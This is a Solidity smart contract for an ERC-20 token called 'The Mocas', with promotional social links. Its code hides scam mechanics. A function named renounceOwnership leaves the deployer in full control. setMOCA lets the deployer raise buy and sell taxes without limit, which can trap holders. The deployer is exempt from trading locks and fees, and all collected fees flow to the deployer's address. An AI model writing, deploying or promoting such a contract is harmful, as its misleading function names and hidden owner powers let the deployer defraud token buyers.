/**

The Mocas is the membership ERC-20 token project to bring together extraordinary family of companies, projects, investments, shareholders, and partners. This project will represent our values surrounding Web3 and digital property rights, as well as our one-of-a-kind ecosystem.

Telegram: https://t.me/TheMocasETH
Twitter: https://twitter.com/TheMocasETH
Website: https://themocas.site

*/

// SPDX-License-Identifier: unlicense

pragma solidity =0.8.18;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

}
interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
contract TheMocas {
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    string public constant name = "The Mocas";   
    string public constant symbol = "MOCA";   
    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals;

    uint256 buyTax = 2;
    uint256 sellTax = 2;
    uint256 constant swapAmount = totalSupply / 1000;
    uint256 constant maxWallet = 100 * totalSupply / 100;

    bool tradingOpened = false;
    bool swapping;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    address immutable pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
    address payable constant deployer = payable(address(0xDC245EDe0d65c34bE7a4D452B86e425AeB81a56d));

    constructor() {
        pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), ETH);
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][routerAddress] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool){
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        allowance[from][msg.sender] -= amount;        
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool){
        balanceOf[from] -= amount;

        if(from != deployer)
            require(tradingOpened);

        if(to != pair && to != deployer)
            require(balanceOf[to] + amount <= maxWallet);

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
            swapping = true;
            address[] memory path = new  address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                swapAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
            deployer.transfer(address(this).balance);
            swapping = false;
        }

        if(from != address(this) && to != deployer){
            uint256 taxAmount = amount * (from == pair ? buyTax : sellTax) / 100;
            amount -= taxAmount;
            balanceOf[address(this)] += taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function openTrading() external {
        require(msg.sender == deployer);
        tradingOpened = true;
    }

    function renounceOwnership() external {
        require(msg.sender == deployer);
        tradingOpened = true;
    }

    function setMOCA(uint256 newBuyTax, uint256 newSellTax) external {
        if(msg.sender == deployer){
            buyTax = newBuyTax;
            sellTax = newSellTax;
        }
        else{
            require(newBuyTax < 10);
            require(newSellTax < 10);
            revert();
        }
        
    }
}